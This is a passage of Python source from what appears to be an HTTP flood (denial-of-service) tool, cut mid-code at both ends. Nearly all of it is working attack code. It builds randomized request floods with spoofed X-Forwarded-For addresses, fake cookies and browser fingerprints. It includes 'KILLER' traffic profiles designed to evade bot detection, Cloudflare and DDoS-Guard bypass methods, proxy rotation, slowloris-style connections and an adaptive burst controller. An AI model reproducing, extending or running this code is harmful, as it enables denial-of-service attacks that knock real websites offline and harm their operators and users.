                ordered.append((key, headers.pop(key)))
        for key, val in headers.items():
            ordered.append((key, val))

        parts = ["%s %s HTTP/1.1\r\n" % (method, path)]
        for name, val in ordered:
            parts.append(self._killer_cased_header(name, val))
        parts.append("\r\n")

        if method == "POST":
            parts.append("data=%s" % ProxyTools.Random.rand_str(randint(16, 128)))

        return str.encode("".join(parts))

    def _killer_payload_v3(self, fp: dict) -> bytes:
        from random import uniform, choice as rc, randint

        method = rc(("GET", "GET", "GET", "POST", "HEAD", "PUT"))
        rand_path = self._killer_rand_path()
        cookie = self._killer_rand_cookie()
        spoof = ProxyTools.Random.rand_ipv4()

        parts = [
            "%s %s HTTP/1.1\r\n" % (method, rand_path),
            "Host: %s\r\n" % self._target.authority,
            "User-Agent: %s\r\n" % fp.get("ua_prefix", rc(self._useragents)),
            "Accept: %s\r\n" % rc(fp["accept"]),
            "Accept-Language: %s\r\n" % rc(fp["languages"]),
            "Accept-Encoding: %s\r\n" % rc((
                "gzip, deflate, br, zstd",
                "gzip, deflate, br",
                "gzip, deflate")),
            "X-Forwarded-For: %s\r\n" % spoof,
        ]

        if fp.get("sec_ch_ua"):
            parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
            parts.append('Sec-CH-UA-Mobile: ?0\r\n')
            parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])

        if cookie:
            parts.append("Cookie: %s\r\n" % cookie)
        if rc([True, False]):
            parts.append("DNT: 1\r\n")
        if rc([True, False]):
            parts.append("Cache-Control: %s\r\n" % rc((
                "no-cache", "no-store", "max-age=0",
                "no-store, must-revalidate")))
        if rc([True, False]):
            parts.append("Connection: keep-alive\r\n")
        if rc([True, False]):
            parts.append("Sec-Fetch-Dest: %s\r\n" % rc((
                "document", "empty", "script",
                "style", "image", "font")))
            parts.append("Sec-Fetch-Mode: %s\r\n" % rc((
                "navigate", "cors", "same-origin")))
            parts.append("Sec-Fetch-Site: %s\r\n" % rc((
                "none", "same-origin", "cross-site")))
            parts.append("Sec-Fetch-User: ?1\r\n")
        if rc([True, False]):
            parts.append("Upgrade-Insecure-Requests: 1\r\n")
        if rc([True, False]):
            parts.append("Sec-GPC: 1\r\n")
        if rc([True, False, False, False]):
            ref = rc(self._referers)
            parts.append("Referer: %s%s\r\n" % (ref, parse.quote(self._target.human_repr())))

        # ── Super Power: Network Info ─────────────────────────────────
        if fp.get("device_memory") and rc([True, False, False, False, False]):
            parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
        if fp.get("viewport") and rc([True, False, False, False, False, False]):
            parts.append("Viewport-Width: %s\r\n" % fp["viewport"].split("x")[0])
        if fp.get("ect") and rc([True, False, False, False, False, False, False]):
            parts.append("ECT: %s\r\n" % rc(fp["ect"]))
            parts.append("RTT: %s\r\n" % rc(fp["rtt"]))
            parts.append("Downlink: %s\r\n" % rc(fp["downlink"]))

        if rc([True, False, False, False, False, False, False, False, False]):
            parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i", "u=0")))

        parts.append("\r\n")

        if method == "POST":
            rand_data = ProxyTools.Random.rand_str(randint(32, 128))
            parts.insert(-1, "Content-Type: application/json\r\n")
            parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
            parts.append('{"data":"%s"}' % rand_data)

        return str.encode("".join(parts))

    @staticmethod
    def _killer_cased_header(name: str, value: str) -> str:
        if name.lower() in HttpFlood._KILLER_CASABLE:
            variant = randint(0, 2)
            if variant == 0:
                name = name.lower()
            elif variant == 1:
                name = name.title()
        return "%s: %s\r\n" % (name, value)

    def _killer_rand_path(self) -> str:
        tmpl = randchoice(self._KILLER_PATHS)
        args = []
        for _ in tmpl.count("%s"):
            args.append(ProxyTools.Random.rand_str(randchoice([4, 6, 8, 12, 16])))
        for _ in tmpl.count("%d"):
            args.append(randint(1, 999999))
        return tmpl % tuple(args) if args else tmpl

    def _killer_rand_cookie(self) -> str:
        parts = []
        if randchoice([True, False, False]):
            parts.append("_ga=GA1.2.%d.%d" % (randint(10000000, 99999999),
                                               randint(1000000000, 1999999999)))
        if randchoice([True, False, False]):
            parts.append("_gid=GA1.2.%d.%d" % (randint(10000000, 99999999),
                                                 randint(1000000000, 1999999999)))
        if randchoice([True, False]):
            parts.append("__cfduid=%s" % ProxyTools.Random.rand_str(43))
        if randchoice([True, False, False, False]):
            parts.append("session=%s" % ProxyTools.Random.rand_str(32))
        if randchoice([True, False, False, False, False]):
            parts.append("_fbp=fb.1.%d.%d" % (randint(1000000000, 1999999999),
                                                randint(100000000, 999999999)))
        if randchoice([True, False, False, False, False, False]):
            parts.append("_gcl_au=%s" % ProxyTools.Random.rand_str(22))
        if randchoice([True, False, False, False, False, False, False]):
            parts.append("csrftoken=%s" % ProxyTools.Random.rand_str(40))
        if randchoice([True, False, False, False, False, False, False, False]):
            parts.append("intercom-session-%s=%s" % (
                ProxyTools.Random.rand_str(8), ProxyTools.Random.rand_str(180)))
        # ── Super Power: Additional realistic cookies ──────────────────
        if randchoice([True, False, False, False, False, False, False, False, False, False]):
            parts.append("_gat_gtag_UA_%d_%d=1" % (randint(1000000, 9999999),
                                                     randint(1, 99)))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False]):
            parts.append("__hstc=%d.%d.%d.%d.%d.%d" % (
                randint(100000000, 999999999),
                randint(100000000, 999999999),
                randint(1000000000, 1999999999),
                randint(1000000000, 1999999999),
                randint(1000000000, 1999999999),
                randint(1000000000, 1999999999)))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("hubspotutk=%s" % ProxyTools.Random.rand_str(32))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("_clck=%d|%d|1" % (randint(1000000000, 1999999999),
                                             randint(1, 99)))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("ab_%s=%s" % (
                ProxyTools.Random.rand_str(randint(6, 12)),
                ProxyTools.Random.rand_str(randint(16, 32))))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("JSESSIONID=%s" % ProxyTools.Random.rand_str(randint(32, 48)))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("PHPSESSID=%s" % ProxyTools.Random.rand_str(26))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("_uetsid=%s" % ProxyTools.Random.rand_str(36))
        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
            parts.append("_uetvid=%s" % ProxyTools.Random.rand_str(36))
        return "; ".join(parts) if parts else ""

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        payload: Any = str.encode(self._payload +
                                  f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               'Accept-Language: en-US,en;q=0.9\r\n'
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                   "Referer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, \
            'This method requires proxies. ' \
            'Without proxies you can use github.com/codesenberg/bombardier'

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)


# ── KILLER Super Power: Standalone Process Entry ──────────────────────
# Avoids Windows pickling issues by not referencing HttpFlood.self

class _KillerSession:
    __slots__ = ('cookies', 'visit_count', 'created_at')
    def __init__(self):
        self.cookies = {}
        self.visit_count = 0
        self.created_at = time()

    def get_cookie_header(self):
        self.visit_count += 1
        parts = []
        if self.visit_count >= 2 and "_ga" not in self.cookies:
            self.cookies["_ga"] = "GA1.2.%d.%d" % (randint(10000000, 99999999),
                                                     randint(1000000000, 1999999999))
        if self.visit_count >= 2 and "_gid" not in self.cookies:
            self.cookies["_gid"] = "GA1.2.%d.%d" % (randint(10000000, 99999999),
                                                      randint(1000000000, 1999999999))
        if self.visit_count >= 3 and "session" not in self.cookies:
            from PyRoxy import Tools as PT
            self.cookies["session"] = PT.Random.rand_str(32)
        if self.visit_count >= 4 and "__cfduid" not in self.cookies:
            from PyRoxy import Tools as PT
            self.cookies["__cfduid"] = PT.Random.rand_str(43)
        if self.visit_count >= 5 and "_fbp" not in self.cookies:
            self.cookies["_fbp"] = "fb.1.%d.%d" % (randint(1000000000, 1999999999),
                                                     randint(100000000, 999999999))
        if self.visit_count >= 6 and "_gcl_au" not in self.cookies:
            from PyRoxy import Tools as PT
            self.cookies["_gcl_au"] = PT.Random.rand_str(22)
        if self.visit_count >= 8 and "csrftoken" not in self.cookies:
            from PyRoxy import Tools as PT
            self.cookies["csrftoken"] = PT.Random.rand_str(40)
        return "; ".join("%s=%s" % (k, v) for k, v in self.cookies.items()) if self.cookies else ""


class _AdaptiveBurstController:
    def __init__(self, initial_workers):
        self.current_workers = initial_workers
        self.max_workers = initial_workers
        self.success_count = 0
        self.fail_count = 0
        self.window_size = 500

    def record_success(self):
        self.success_count += 1
        self._maybe_adjust()

    def record_failure(self):
        self.fail_count += 1
        self._maybe_adjust()

    def _maybe_adjust(self):
        total = self.success_count + self.fail_count
        if total < self.window_size:
            return
        rate = self.success_count / total if total > 0 else 0
        if rate > 0.95:
            self.current_workers = min(self.current_workers + 5, self.max_workers)
        elif rate < 0.80:
            self.current_workers = max(self.current_workers - 10, 20)
        self.success_count = 0
        self.fail_count = 0

    def get_burst_size(self):
        return max(self.current_workers // 4, 10)


def _killer_rand_path_fast(cached_paths):
    from random import choice as rc, randint
    tmpl = rc(cached_paths)
    args = []
    for _ in tmpl.count("%s"):
        from PyRoxy import Tools as PT
        args.append(PT.Random.rand_str(randchoice([4, 6, 8, 12])))
    for _ in tmpl.count("%d"):
        args.append(randint(1, 999999))
    return tmpl % tuple(args) if args else tmpl


def _killer_build_referrer(target_authority):
    from random import choice as rc, randint
    from PyRoxy import Tools as PT
    chains = [
        "https://www.google.com/search?q=%s" % PT.Random.rand_str(randint(3, 12)),
        "https://www.bing.com/search?q=%s" % PT.Random.rand_str(randint(3, 12)),
        "https://%s/" % target_authority,
        "https://duckduckgo.com/?q=%s" % PT.Random.rand_str(randint(3, 12)),
    ]
    return rc(chains)


_KILLER_PATHS_STANDALONE = (
    "/?page=%d", "/search?q=%s", "/api/v1/%s", "/static/%s",
    "/images/%s", "/assets/%s", "/data/%s", "/feed/%s",
    "/index.html?%s=%s", "/%s", "/%s/%s",
    "/css/%s", "/js/%s", "/fonts/%s", "/media/%s",
    "/downloads/%s", "/uploads/%s", "/content/%s",
    "/v2/%s", "/v3/%s", "/rest/%s", "/graphql",
    "/wp-admin/%s", "/wp-content/%s", "/wp-includes/%s",
    "/blog/%s", "/news/%s", "/articles/%s", "/posts/%s",
)


def _killer_build_request_standalone(method, path, fp, target_authority,
                                     referers, cached_target_path):
    from random import randint, choice as rc
    from PyRoxy import Tools as PT

    headers = {}
    headers["host"] = target_authority
    headers["user-agent"] = fp["ua_prefix"]

    if fp.get("sec_ch_ua"):
        headers["sec-ch-ua"] = fp["sec_ch_ua"]
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = fp["platform"]

    headers["accept"] = fp["accept"]
    headers["accept-language"] = rc(fp["languages"])
    headers["accept-encoding"] = rc((
        "gzip, deflate, br, zstd",
        "gzip, deflate, br",
        "gzip, deflate",
    ))
    headers["x-forwarded-for"] = PT.Random.rand_ipv4()

    if method == "POST":
        rand_data = PT.Random.rand_str(randint(16, 128))
        headers["content-type"] = rc((
            "application/x-www-form-urlencoded",
            "application/json"))
        headers["content-length"] = str(len(rand_data) + 5)

    if rc([True, False]):
        headers["connection"] = "keep-alive"
    if rc([True, False]):
        headers["dnt"] = "1"
    if rc([True, True, False]):
        headers["cache-control"] = rc((
            "no-cache", "no-store, must-revalidate", "max-age=0"))

    if rc([True, True, False]):
        headers["sec-fetch-dest"] = rc((
            "document", "empty", "script",
            "style", "image", "font"))
        headers["sec-fetch-mode"] = rc((
            "navigate", "cors", "same-origin"))
        headers["sec-fetch-site"] = rc((
            "none", "same-origin", "cross-site", "same-site"))
        headers["sec-fetch-user"] = "?1"

    if rc([True, False]):
        headers["upgrade-insecure-requests"] = "1"

    if fp.get("sec_ch_ua") is None and rc([True, False, False, False, False]):
        headers["sec-gpc"] = "1"

    if rc([True, False]):
        headers["pragma"] = "no-cache"

    if rc([True, False, False, False]):
        ref = rc(referers)
        headers["referer"] = "%s%s" % (ref, cached_target_path)

    if fp.get("device_memory") and rc([True, False, False, False, False]):
        headers["device-memory"] = rc(fp["device_memory"])
    if fp.get("viewport") and rc([True, False, False, False, False, False]):
        vp = fp["viewport"].split("x")
        headers["viewport-width"] = vp[0]
    if fp.get("ect") and rc([True, False, False, False, False, False, False]):
        headers["ect"] = rc(fp["ect"])
        headers["rtt"] = rc(fp["rtt"])
        headers["downlink"] = rc(fp["downlink"])

    if rc([True, False, False, False, False, False, False, False, False]):
        headers["priority"] = rc(("u=0, i", "u=1, i", "u=0"))

    order = fp["order"]
    ordered = []
    for key in order:
        if key in headers:
            ordered.append((key, headers.pop(key)))
    for key, val in headers.items():
        ordered.append((key, val))

    parts = ["%s %s HTTP/1.1\r\n" % (method, path)]
    for name, val in ordered:
        variant = randint(0, 2)
        if variant == 0:
            name = name.lower()
        elif variant == 1:
            name = name.title()
        parts.append("%s: %s\r\n" % (name, val))
    parts.append("\r\n")

    if method == "POST":
        parts.append("data=%s" % PT.Random.rand_str(randint(16, 128)))

    return str.encode("".join(parts))


def _killer_process_entry(max_workers, rpc,
                          target_host, target_port, target_scheme,
                          target_authority, raw_target, is_https,
                          proxy_data, useragents, referers, fingerprints):
    from random import uniform, randint, choice as rc, expovariate
    from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
    from socket import TCP_NODELAY, IPPROTO_TCP
    from concurrent.futures import ThreadPoolExecutor
    from ssl import SSLContext, create_default_context, CERT_NONE
    import ssl as _ssl
    from PyRoxy import Proxy, ProxyType, Tools as PT
    from PyRoxy import Tools as ProxyTools

    try:
        from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
    except ImportError:
        HAS_CURL_CFFI = False

    ctx = create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = CERT_NONE
    if hasattr(ctx, "minimum_version") and hasattr(_ssl, "TLSVersion"):
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2

    proxy_objects = []
    for pdata in proxy_data:
        try:
            ptype = ProxyType(pdata[0])
            proxy_objects.append(Proxy(ptype, pdata[1], pdata[2], pdata[3] or None, pdata[4] or None))
        except Exception:
            pass

    def _open_conn():
        if proxy_objects:
            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        try:
            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        except Exception:
            pass
        try:
            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
        except Exception:
            pass
        try:
            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
        except Exception:
            pass
        sock.settimeout(3.0)
        raw = raw_target
        sock.connect(raw)
        if is_https:
            sock = ctx.wrap_socket(sock, server_hostname=target_host,
                                   server_side=False, do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    conn_pool = []
    pool_lock = Lock()
    active = True
    refill_backoff = 0.001
    cached_target_path = parse.quote("/%s" % target_authority) if target_authority else "/"
    fp_list = list(fingerprints)
    ua_list = list(useragents)
    ref_list = list(referers)

    def refill_pool():
        nonlocal refill_backoff
        while active:
            with pool_lock:
                if len(conn_pool) >= max_workers:
                    refill_backoff = 0.001
                    break
            try:
                s = _open_conn()
                with pool_lock:
                    conn_pool.append(s)
                refill_backoff = 0.001
            except Exception:
                sleep(min(refill_backoff, 0.5))
                refill_backoff = min(refill_backoff * 2, 0.5)
                continue

    def get_connection():
        with pool_lock:
            while conn_pool:
                s = conn_pool.pop()
                try:
                    s.setblocking(False)
                    s.recv(0, 0x400 | 0x40)
                    s.setblocking(True)
                    return s
                except (BlockingIOError, OSError):
                    try:
                        s.close()
                    except Exception:
                        pass
        try:
            return _open_conn()
        except Exception:
            return None

    def return_connection(s):
        if s is None:
            return
        with pool_lock:
            if len(conn_pool) < max_workers:
                conn_pool.append(s)
                return
        try:
            s.close()
        except Exception:
            pass

    def _worker(get_conn, return_conn, rpc_count, burst_ctrl, session_cache):
        fp = rc(fp_list)
        s = get_conn()
        if s is None:
            return

        try:
            sid = id(s)
            if sid not in session_cache:
                session_cache[sid] = _KillerSession()
            ks = session_cache[sid]

            profile_name, profile_steps = rc((
                ("PAGE_LOAD", (
                    ("GET", "/"),
                    ("GET", "/style.css"),
                    ("GET", "/app.js"),
                    ("GET", "/favicon.ico"),
                )),
                ("API_CALL", (
                    ("GET", "/api/v1/data"),
                    ("POST", "/api/v1/track"),
                    ("GET", "/api/v1/user"),
                )),
                ("SEARCH", (
                    ("GET", "/search?q={rand}"),
                    ("GET", "/results"),
                    ("GET", "/suggest?q={rand}"),
                )),
                ("SPA_NAV", (
                    ("GET", "/"),
                    ("GET", "/assets/main.{rand}.js"),
                    ("GET", "/api/v2/config"),
                    ("GET", "/api/v2/user"),
                )),
                ("RAW_FLOOD", None),
            ))

            if profile_steps and profile_name != "RAW_FLOOD":
                for i, (method, path) in enumerate(profile_steps):
                    path = path.replace("{rand}", PT.Random.rand_str(8))
                    payload = _killer_build_request_standalone(
                        method, path, fp, target_authority,
                        ref_list, cached_target_path)
                    if not Tools.send(s, payload):
                        burst_ctrl.record_failure()
                        break
                    burst_ctrl.record_success()
                    if i == 0:
                        sleep(expovariate(1.0 / 0.12))
                    elif i == 1:
                        sleep(expovariate(1.0 / 0.03))
                    else:
                        sleep(expovariate(1.0 / 0.015))
            else:
                batch = min(rpc, randint(5, 15))
                for _ in range(batch):
                    method = rc(("GET", "GET", "GET", "POST", "HEAD"))
                    rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
                    cookie = ks.get_cookie_header()
                    spoof = PT.Random.rand_ipv4()

                    parts = [
                        "%s %s HTTP/1.1\r\n" % (method, rand_path),
                        "Host: %s\r\n" % target_authority,
                        "User-Agent: %s\r\n" % fp["ua_prefix"],
                        "Accept: %s\r\n" % rc(fp["accept"]),
                        "Accept-Language: %s\r\n" % rc(fp["languages"]),
                        "Accept-Encoding: %s\r\n" % rc((
                            "gzip, deflate, br, zstd",
                            "gzip, deflate, br",
                            "gzip, deflate")),
                        "X-Forwarded-For: %s\r\n" % spoof,
                    ]
                    if fp.get("sec_ch_ua"):
                        parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
                        parts.append('Sec-CH-UA-Mobile: ?0\r\n')
                        parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
                    if cookie:
                        parts.append("Cookie: %s\r\n" % cookie)
                    if rc([True, False]):
                        parts.append("DNT: 1\r\n")
                    if rc([True, False]):
                        parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
                    if rc([True, False]):
                        parts.append("Connection: keep-alive\r\n")
                    if rc([True, True, False]):
                        parts.append("Sec-Fetch-Dest: %s\r\n" % rc(("document", "empty", "script")))
